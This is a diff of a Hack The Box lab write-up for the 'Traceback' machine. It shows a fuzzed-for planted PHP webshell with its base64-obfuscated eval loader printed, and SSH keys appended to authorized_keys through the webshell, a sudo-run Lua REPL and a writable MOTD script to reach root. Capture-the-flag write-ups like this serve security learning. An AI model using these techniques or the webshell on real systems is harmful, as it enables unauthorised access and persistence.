@@ -2,7 +2,7 @@
 
 ## Overview
 
-![](traceback.infocard.png)
+![](../../.gitbook/assets/traceback-infocard.png)
 
 Short description to include any strange things to be dealt with
 
@@ -22,30 +22,53 @@ description with generic example
 
 I started off my enumeration with an nmap scan of `10.10.10.181`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all TCP ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, `-oN <name>` saves the output with a filename of `<name>`.
 
+```text
+zweilos@kali:~/htb/traceback$ nmap -p- -sC -sV -oN traceback.nmap 10.10.10.181
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-21 16:39 EDT
+Nmap scan report for 10.10.10.181
+Host is up (0.048s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA)
+|   256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA)                                        
+|_  256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519)                                      
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))                                                    
+|_http-server-header: Apache/2.4.29 (Ubuntu)                                                           
+|_http-title: Help us                                                                                  
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                                                
+                                                                                                       
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .         
+Nmap done: 1 IP address (1 host up) scanned in 40.09 seconds
+```
+
 Only port 22 and 80 open
 
-```
-This site has been owned
-I have left a backdoor for all the net. FREE INTERNETZZZ
-- Xh4H - 
-```
-connecting to ssh: 
-```
+connecting to ssh:
+
+```text
 #################################
 -------- OWNED BY XH4H  ---------
 - I guess stuff could have been configured better ^^ -
 #################################
 ```
-gobuster dir -u http://10.10.10.181 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o traceback.gobuster
+
+
+
+![](../../.gitbook/assets/screenshot_2020-06-21_16-48-34%20%281%29.png)
+
+`gobuster dir -u http://10.10.10.181 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o traceback.gobuster`
 
 connection blocked and nothing found
 
-web search for `FREE INTERNETZZZ` leads to "Pretty interesting collection of webshells:" https://twitter.com/RiftWhiteHat/status/1237311680276647936 which leads to https://github.com/TheBinitGhimire/Web-Shells
+web search for `FREE INTERNETZZZ` leads to "Pretty interesting collection of webshells:" [https://twitter.com/RiftWhiteHat/status/1237311680276647936](https://twitter.com/RiftWhiteHat/status/1237311680276647936) which leads to [https://github.com/TheBinitGhimire/Web-Shells](https://github.com/TheBinitGhimire/Web-Shells)
 
 OSINT challenge?
 
-I didn't know which web shell was used, and the hint left by @XH4H only led to a list of shells, so I created a list of the filenames and used wfuzz to check to see if they had been used
-```
+I didn't know which web shell was used, and the hint left by @XH4H only led to a list of shells. I downloaded them all and started poking through the code to see if anything looked familiar, but most of it was obfuscated and I couldn't find the phrase `FREE INTERNETZZZ` in any of the files. So, I created a list of the filenames and used `wfuzz` to check to see if any of them had been uploaded to the site \(and I hoped that the filename hadn't been changed!
+
+```bash
 zweilos@kali:~/htb/traceback/webshells$ ls -1 > webshells
 zweilos@kali:~/htb/traceback/webshells$ wfuzz -c -w webshells --sc 200 http://10.10.10.181/FUZZ
 Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
@@ -76,7 +99,9 @@ found `http://10.10.10.181/smevk.php`
 
 screenshot
 
-```
+![](../../.gitbook/assets/screenshot_2020-06-22_13-13-58.png)
+
+```text
 <?php 
 /*
 SmEvK_PaThAn Shell v3 Coded by Kashif Khan .
@@ -112,10 +137,14 @@ ZXhpc3RzKCdhY3Rpb24nIC4gJF9QT1NUWydhJ10pICkKICAgIGNhbGxfdXNlcl9mdW5jKCdhY3Rpb24n
 eval("?>".(base64_decode($smevk)));
 ?>
 ```
-used default credentials of `admin:admin` from https://github.com/TheBinitGhimire/Web-Shells/blob/master/smevk.php
 
-It seems as if a lot of the functionality was stripped out...most of the buttons do nothing. Never mind...DOESNT WORK IN FIREFOX!!!! > worked just fine in Chromium!
-```
+used default credentials of `admin:admin` from [https://github.com/TheBinitGhimire/Web-Shells/blob/master/smevk.php](https://github.com/TheBinitGhimire/Web-Shells/blob/master/smevk.php)
+
+![](../../.gitbook/assets/screenshot_2020-06-22_13-18-32.png)
+
+It seems as if a lot of the functionality was stripped out...most of the buttons do nothing. Never mind...DOESNT WORK IN FIREFOX!!!! &gt; worked just fine in Chromium!
+
+```text
 zweilos@kali:~/htb/traceback$ echo 'PD9waHAKCiRkZWZhdWx0X2FjdGlvbiA9ICdGaWxlc01hbic7CkBkZWZpbmUoJ1NFTEZfUEFUSCcsIF9fRklMRV9fKTsKaWYoIHN0cnBvcygkX1NFUlZFUlsn\
 SFRUUF9VU0VSX0FHRU5UJ10sJ0dvb2dsZScpICE9PSBmYWxzZSApIHsKICAgIGhlYWRlcignSFRUUC8xLjAgNDA0IE5vdCBGb3VuZCcpOwog\
 ICAgZXhpdDsKfQoKQHNlc3Npb25fc3RhcnQoKTsKQGVycm9yX3JlcG9ydGluZygwKTsKQGluaV9zZXQoJ2Vycm9yX2xvZycsTlVMTCk7CkBp\
@@ -153,24 +182,30 @@ if( get_magic_quotes_gpc() ) {
 function printLogin() {
  if ($_POST['pass'] != $auth_pass && $_POST['uname'] != $UserName) {
     $status = 'Wrong Password or UserName :(';
-    
+
 
 }
 
 ?base64: invalid input
 ```
-After doing some troubleshooting and looking into the code it seems as if the webshell itself is looking for HTTP_USER_AGENT with 'Google' in it.  Not sure why this might interfere since it seems to give a 404 error if the user agent IS Google...
+
+After doing some troubleshooting and looking into the code it seems as if the webshell itself is looking for HTTP\_USER\_AGENT with 'Google' in it. Not sure why this might interfere since it seems to give a 404 error if the user agent IS Google...
 
 ## Road to User
 
-https://www.ssh.com/ssh/keygen/ 
+[https://www.ssh.com/ssh/keygen/](https://www.ssh.com/ssh/keygen/)
 
-ssh-copy-id -i ~/.ssh/tatu-key-ecdsa user@host (site says this works remotely, but would need password it seems so I did it the old fashioned way)
+`ssh-copy-id -i ~/.ssh/tatu-key-ecdsa user@host` \(site says this works remotely, but would need password it seems so I did it the old fashioned way\)
 
-`echo "ssh-rsa AAAA<my_public_key> zweilos@kali" >> /home/webadmin/.ssh/authorized_keys` into the `execute` field
+![](../../.gitbook/assets/screenshot_2020-06-22_17-41-38.png)
+
+I noticed that the webshell told me that the username we had control of was `webadmin`, so I decided to try to add my public SSH key to the `.ssh/authorized_keys` file and see if it would let me log in that way. I entered the command`echo "ssh-rsa AAAA<my_public_key> zweilos@kali" >> /home/webadmin/.ssh/authorized_keys` into the `execute` field in the web shell
 
 ### Enumeration as `webadmin`
-```
+
+After that it was easy to just SSH into the machine using my own private key.
+
+```text
 zweilos@kali:~/htb/traceback$ ssh webadmin@10.10.10.181
 #################################
 -------- OWNED BY XH4H  ---------
@@ -184,8 +219,10 @@ webadmin@traceback:~$ whoami && hostname
 webadmin
 traceback
 ```
+
 First thing, see if we can execute anything with `sudo` using the `-l` flag
-```
+
+```text
 webadmin@traceback:~$ sudo -l
 Matching Defaults entries for webadmin on traceback:
     env_reset, mail_badpass,
@@ -194,21 +231,26 @@ Matching Defaults entries for webadmin on traceback:
 User webadmin may run the following commands on traceback:
     (sysadmin) NOPASSWD: /home/sysadmin/luvit
 ```
+
 seems like we can execute the `luvit` program in `sysadmin`'s home folder as that user
 
 ### Making user creds
-```
+
+```text
 webadmin@traceback:~$ sudo -u sysadmin /home/sysadmin/luvit
 Welcome to the Luvit repl!
 >
 ```
-```
+
+```text
 Repl
 #
 
 Implementation of a read-execute-print-loop in Luvit. Used by the Luvit repl which is returned when the Luvit binary is executed without args.
 ```
-from https://www.lua.org/pil/22.2.html => os.execute("mkdir " .. dirname)
+
+from [https://www.lua.org/pil/22.2.html](https://www.lua.org/pil/22.2.html) =&gt; os.execute\("mkdir " .. dirname\)
+
 ```lua
 > os.execute("ls")
 note.txt
@@ -217,7 +259,9 @@ true    'exit'  0
 sh: 1: catnote.txt: not found
 nil     'exit'  127
 ```
+
 So you will need to make sure to put a space between the command and the argument manually, as this seems to just concatenate the two strings then execute. The space can either be at the end of the command or the beginning of the argugments.
+
 ```lua
 > os.execute("cat" .. " note.txt")
 - sysadmin -
@@ -237,12 +281,13 @@ true    'exit'  0
 
 ### Getting a shell as `sysadmin`
 
-https://simion.com/info/calling_external_programs.html
+[https://simion.com/info/calling\_external\_programs.html](https://simion.com/info/calling_external_programs.html)
 
-```
+```text
 > os.execute 'echo "ssh-rsa AAAA<my_public_key> zweilos@kali" >> /home/sysadmin/.ssh/authorized_keys'
 ```
-```
+
+```text
 zweilos@kali:~/htb/traceback$ ssh sysadmin@10.10.10.181
 #################################
 -------- OWNED BY XH4H  ---------
@@ -257,14 +302,16 @@ Last login: Mon Mar 16 03:50:24 2020 from 10.10.14.2
 $ whoami
 sysadmin
 ```
+
 ## Path to Power \(Gaining Administrator Access\)
 
 ### Enumeration as `sysadmin`
-start out in `/bin/sh`, which is kind of limiting (no history or tab completion, etc) `perl -e 'exec "/bin/bash";'` gets a nice bash shell (python was not installed...but python3 is... dummy!)
+
+start out in `/bin/sh`, which is kind of limiting \(no history or tab completion, etc\) `perl -e 'exec "/bin/bash";'` gets a nice bash shell \(python was not installed...but python3 is... dummy!\)
 
 see all processes from root user `ps -U root -u root ux`
 
-```
+```text
 sysadmin@traceback:/$ ps -U root -u root u
 USER        PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
 ...snipped
@@ -285,10 +332,11 @@ root      10010  0.0  0.1  63516  4220 pts/2    S+   16:43   0:00 sudo -u sysadm
 root      10209  0.0  0.0  58792  3152 ?        S    16:52   0:00 /usr/sbin/CRON -f
 root      10212  0.0  0.0   4628   812 ?        Ss   16:52   0:00 /bin/sh -c sleep 30 ; /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/
 root      10213  0.0  0.0   7468   840 ?        S    16:52   0:00 sleep 30
+```
 
-```
 There is a script running every 30 seconds which restores a backup of the MOTD...I wonder why? I checked both of these directories to see if could edit the files
-```
+
+```text
 sysadmin@traceback:/var/backups/.update-motd.d$ cd /etc/update-motd.d/
 sysadmin@traceback:/etc/update-motd.d$ ls -la
 total 32
@@ -300,8 +348,10 @@ drwxr-xr-x 80 root root     4096 Mar 16 03:55 ..
 -rwxrwxr-x  1 root sysadmin  604 Jun 22 17:07 80-esm
 -rwxrwxr-x  1 root sysadmin  299 Jun 22 17:07 91-release-upgrade
 ```
-These files are editable by `sysadmin`. 
-```
+
+These files are editable by `sysadmin`.
+
+```text
 sysadmin@traceback:/etc/update-motd.d$ cat 00-header 
 #!/bin/sh
 #
@@ -328,16 +378,18 @@ sysadmin@traceback:/etc/update-motd.d$ cat 00-header
 
 echo "\nWelcome to Xh4H land \n"
 ```
+
 The file `00-header`seem to have been edited already by `Xh4H` when he defaced the site and set up his webshell. Since this is a bash script, can add commands to it that will be run when someone logs in.
 
 ### Getting a root shell
 
-every 30 secs the cronjob copies backups from /var/backups/.update-motd.d/ to /etc/update-motd.d/. This is the window where I have to execute the commands I need and initiate my exploit before the backup wipes my progress.  I decided to go for broke and simply do the same privesc I had already been using.  I copied my public ssh key to `authorized_keys` file, this time in the `/root/.ssh/` folder.  In order to execute my command, I needed to run the motd program.  This program is automatically run upon login, so I simply connected back to the `sysadmin` user through ssh, then logged out and logged in to `root` using ssh.  
+every 30 secs the cronjob copies backups from /var/backups/.update-motd.d/ to /etc/update-motd.d/. This is the window where I have to execute the commands I need and initiate my exploit before the backup wipes my progress. I decided to go for broke and simply do the same privesc I had already been using. I copied my public ssh key to `authorized_keys` file, this time in the `/root/.ssh/` folder. In order to execute my command, I needed to run the motd program. This program is automatically run upon login, so I simply connected back to the `sysadmin` user through ssh, then logged out and logged in to `root` using ssh.
 
-```
+```text
 sysadmin@traceback:/etc/update-motd.d$ echo 'echo "ssh-rsa AAAA<my_public_key> zweilos@kalimaa" >> /root/.ssh/authorized_keys' >> 00-header
 ```
-```
+
+```text
 zweilos@kalimaa:~/htb/traceback$ ssh root@10.10.10.181
 #################################
 -------- OWNED BY XH4H  ---------
@@ -353,14 +405,17 @@ root@traceback:~# whoami && hostname
 root
 traceback
 ```
+
 ### Root.txt
 
-```
+```text
 root@traceback:~# cat root.txt 
 459b10823b6b0c485f082026477dcfa7
 ```
-(asdg)[testlink]
+
+\(asdg\)\[testlink\]
 
 Thanks to [`Xh4H`](https://www.hackthebox.eu/home/users/profile/21439) for something interesting or useful about this machine.
 
 If you like this content and would like to see more, please consider supporting me through Patreon at [https://www.patreon.com/zweilosec](https://www.patreon.com/zweilosec).
+
